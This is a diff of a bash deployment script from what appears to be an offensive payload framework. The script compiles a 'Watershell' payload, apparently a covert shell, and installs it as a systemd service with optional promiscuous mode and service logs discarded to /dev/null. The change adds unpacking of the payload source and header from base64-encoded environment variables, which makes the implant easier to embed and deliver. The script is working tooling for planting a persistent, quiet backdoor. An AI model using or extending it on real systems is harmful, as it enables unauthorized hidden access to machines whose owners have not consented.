@@ -32,15 +32,36 @@ run_priv_checked() {
 
 require_privilege
 
+TMP_BUILD_DIR="$(mktemp -d)"
+
+cleanup_tmp() {
+    rm -rf "$TMP_BUILD_DIR"
+}
+trap cleanup_tmp EXIT
+
 WATERSHELL_SOURCE="${WATERSHELL_SOURCE:-}"
 WATERSHELL_HEADER="${WATERSHELL_HEADER:-}"
 
+if [[ -n "${WATERSHELL_SOURCE_B64:-}" || -n "${WATERSHELL_HEADER_B64:-}" ]]; then
+    command -v base64 >/dev/null 2>&1 || fail "base64 is required to unpack embedded Watershell assets"
+fi
+
 if [[ -z "$WATERSHELL_SOURCE" ]]; then
-    WATERSHELL_SOURCE="$FRAMEWORK_ROOT/payloads/shared/watershell.c"
+    if [[ -n "${WATERSHELL_SOURCE_B64:-}" ]]; then
+        WATERSHELL_SOURCE="${TMP_BUILD_DIR}/watershell.c"
+        printf '%s' "$WATERSHELL_SOURCE_B64" | base64 -d > "$WATERSHELL_SOURCE"
+    else
+        WATERSHELL_SOURCE="${FRAMEWORK_ROOT:-}/payloads/shared/watershell.c"
+    fi
 fi
 
 if [[ -z "$WATERSHELL_HEADER" ]]; then
-    WATERSHELL_HEADER="$FRAMEWORK_ROOT/payloads/shared/watershell.h"
+    if [[ -n "${WATERSHELL_HEADER_B64:-}" ]]; then
+        WATERSHELL_HEADER="${TMP_BUILD_DIR}/watershell.h"
+        printf '%s' "$WATERSHELL_HEADER_B64" | base64 -d > "$WATERSHELL_HEADER"
+    else
+        WATERSHELL_HEADER="${FRAMEWORK_ROOT:-}/payloads/shared/watershell.h"
+    fi
 fi
 
 [[ -f "$WATERSHELL_SOURCE" ]] || fail "Missing Watershell source: $WATERSHELL_SOURCE"
@@ -71,13 +92,6 @@ WATERSHELL_PROMISC="${WATERSHELL_PROMISC:-false}"
 SERVICE_LOG_FILE="${SERVICE_LOG_FILE:-/dev/null}"
 ENABLE_SERVICE="${ENABLE_SERVICE:-true}"
 START_SERVICE="${START_SERVICE:-true}"
-
-TMP_BUILD_DIR="$(mktemp -d)"
-
-cleanup_tmp() {
-    rm -rf "$TMP_BUILD_DIR"
-}
-trap cleanup_tmp EXIT
 
 TMP_BINARY="${TMP_BUILD_DIR}/${SERVICE_BINARY_NAME}"
 TMP_UNIT="${TMP_BUILD_DIR}/${SERVICE_BINARY_NAME}.service"
